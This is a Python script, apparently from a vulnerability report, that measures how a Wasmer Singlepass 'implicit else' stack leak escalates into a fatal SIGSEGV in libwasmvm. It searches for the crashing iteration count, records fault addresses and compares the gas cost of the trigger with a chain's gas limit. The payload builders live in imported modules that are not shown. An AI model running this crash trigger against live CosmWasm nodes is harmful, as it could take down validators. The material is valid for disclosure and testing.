#!/usr/bin/env python3
"""
Evidence matrix for the escalation of the Singlepass "implicit else" leak.

Result under test
------------------
The leak lowers RSP by one 8-byte slot per iteration of an `if` with an
*implicit* else whose condition is false.  `sub rsp, N` is a pure register
operation and the value-stack slots are addressed relative to RBP, so a loop
that contains **no call** drifts RSP below the lower guard page without ever
touching it.  The next `call` then pushes the return address at RSP-8, which
is *below* the guard page: the fault is reported with SP < limit, wasmer's
`stack_ptr_in_bounds(sp)` check fails, `handle_trap` returns false, the signal
handler restores SIG_DFL and the process dies with SIGSEGV.

This script measures, for several Wasm stack sizes:
  * the last iteration count that still yields the recoverable
    "call stack exhausted" trap,
  * the first iteration count that kills the process with SIGSEGV,
  * the fault address / RSP / RIP at the boundary,
  * the VM gas points (and the SDK gas) the trigger costs.

Usage:
    python3 escalation_matrix.py [--prefix N] [--stacks 512K,1M,2M,4M]
"""

import argparse
import os
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import escalate as E                                     # noqa: E402
import fault_probe                                      # noqa: E402
import run_poc as R                                     # noqa: E402

MULT = 140_000          # wasmd DefaultGasMultiplier (CosmWasm points -> SDK gas)
CHAIN_MAX_GAS = 2_000_000


def trial(wasm, stack_size):
    """Runs one candidate in a child; returns 'died' or the error string."""
    pid = os.fork()
    if pid == 0:
        r = E.run_child(wasm, stack_size)
        msg = (r.get("err") or "OK").replace("\n", " ")[:52]
        sys.stdout.write("    %-9s %s\n" % ("returned", msg))
        sys.stdout.flush()
        os._exit(0)
    _, status = os.waitpid(pid, 0)
    if os.WIFSIGNALED(status):
        return "SIGSEGV(%d)" % os.WTERMSIG(status)
    if os.WIFEXITED(status) and os.WEXITSTATUS(status) != 0:
        return "exit(%d)" % os.WEXITSTATUS(status)
    return None


def boundary(prefix, stack_size, probe=False):
    """Finds the last recoverable and the first fatal iteration count."""
    # coarse scan: find where the recoverable trap starts
    lo, hi = 1, 1 << 21
    while lo < hi:
        mid = (lo + hi) // 2
        wasm = E.build(mid, prefix, True)
        out = trial(wasm, stack_size)
        if out and out.startswith("SIGSEGV"):
            hi = mid
        else:
            lo = mid + 1
    fatal = lo
    # the boundary is within a few iterations: scan down
    recoverable = None
    for n in range(fatal, max(0, fatal - 64), -1):
        wasm = E.build(n, prefix, True)
        out = trial(wasm, stack_size)
        if out is None:
            recoverable = n
            break
    return recoverable, fatal


def fault_at(n, prefix, stack_size):
    """Captures fault_addr / RSP / RIP at iteration count `n`."""
    r_fd, w_fd = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r_fd)
        wasm = E.build(n, prefix, True)
        try:
            E.probe_inline(wasm, stack_size, w_fd)
        except Exception:
            pass
        os._exit(0)
    os.close(w_fd)
    _, status = os.waitpid(pid, 0)
    data = os.read(r_fd, 4096).decode(errors="replace").strip()
    os.close(r_fd)
    return data, status


def gas_of(iterations, prefix, probe=False):
    """Measures the VM gas points of the module.

    The module kills the process at the fatal iteration count, so the
    measurement runs in a child that reports the number back over a pipe.
    With `probe=False` the trailing call is omitted: the module then runs to
    completion and the gas is reported (the trailing call costs a handful of
    extra points).
    """
    r_fd, w_fd = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(r_fd)
        wasm = E.build(iterations, prefix, probe)
        base = tempfile.mkdtemp(prefix="wasmvm-gas-")
        vm = R.VM()
        cache = vm.init_cache(base)
        checksum = vm.store_code(cache, wasm, checked=True)
        vm.instantiate(cache, checksum, 1 << 62)
        res2, rep2, err2 = vm.execute(cache, checksum, 1 << 62)
        os.write(w_fd, b"%d|%s" % (rep2.used_internally,
                                   vm._vec_str(err2).replace("\n", " ").encode()))
        os.close(w_fd)
        os._exit(0)
    os.close(w_fd)
    data = os.read(r_fd, 65536).decode(errors="replace")
    os.close(r_fd)
    os.waitpid(pid, 0)
    if "|" not in data:
        return None, data.strip()
    used, err = data.split("|", 1)
    return int(used), err


def _addr_delta(a, b):
    """Bytes of stack the leak moves per iteration (from two fault addresses)."""
    try:
        aa = int(a.split("addr=0x")[1].split()[0], 16)
        bb = int(b.split("addr=0x")[1].split()[0], 16)
        return aa - bb
    except Exception:
        return "?"


def parse_size(s):
    s = s.strip().upper()
    mult = {"K": 1024, "M": 1024 * 1024, "G": 1024 ** 3}
    if s and s[-1] in mult:
        return int(s[:-1]) * mult[s[-1]]
    return int(s)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--prefix", type=int, default=4)
    ap.add_argument("--no-gas", action="store_true")
    ap.add_argument("--control", action="store_true",
                    help="also run the explicit-else control")
    args = ap.parse_args()

    print("Escalation of the Singlepass implicit-else leak to a process crash")
    print("libwasmvm under test: %s" % R.LIB)
    print("the Wasm stack size is wasmer's DEFAULT_STACK_SIZE (1 MiB); the harness")
    print("`--stack` knob only sizes the *host thread* stack, not the Wasm stack.")
    print()
    print("%-10s %-12s %-14s %-10s %s"
          % ("prefix", "recoverable", "fatal(SIGSEGV)", "leak B/iter",
             "fault at the boundary"))
    print("-" * 104)

    rows = []
    prefix = args.prefix
    rec, fatal = boundary(prefix, 1 << 20)
    data, status = fault_at(fatal, prefix, 1 << 20)
    data2, _ = fault_at(fatal + 1, prefix, 1 << 20)
    leak = _addr_delta(data, data2)
    print("%-10d %-12s %-14s %-10s %s"
          % (prefix, rec, fatal, leak, data))
    sys.stdout.flush()
    rows.append((prefix, rec, fatal))

    if args.control:
        print()
        print("Control: the identical module with an explicit `else` (no leak)")
        for n in (rows[0][1], rows[0][2], 200000):
            wasm = E.build(n, prefix, True, explicit_else=True)
            out = trial(wasm, 1 << 20)
            print("   prefix=%d iters=%-8d -> %s"
                  % (prefix, n, out or "OK (no trap, no crash)"))
            sys.stdout.flush()

    if not args.no_gas:
        print()
        print("Coste del disparador (puntos de gas de la VM / gas SDK)")
        prefix, rec, fatal = rows[0]
        used, err = gas_of(fatal, prefix, probe=False)
        if used:
            print("   %d iteraciones -> %d puntos VM = %d gas SDK   (max_gas de la cadena: %d)"
                  % (fatal, used, used // MULT, CHAIN_MAX_GAS))
            print("   margen frente al limite de la cadena: %.0fx"
                  % (CHAIN_MAX_GAS / max(1, used // MULT)))
        else:
            print("   no se pudo medir el gas: %s" % err)


if __name__ == "__main__":
    main()
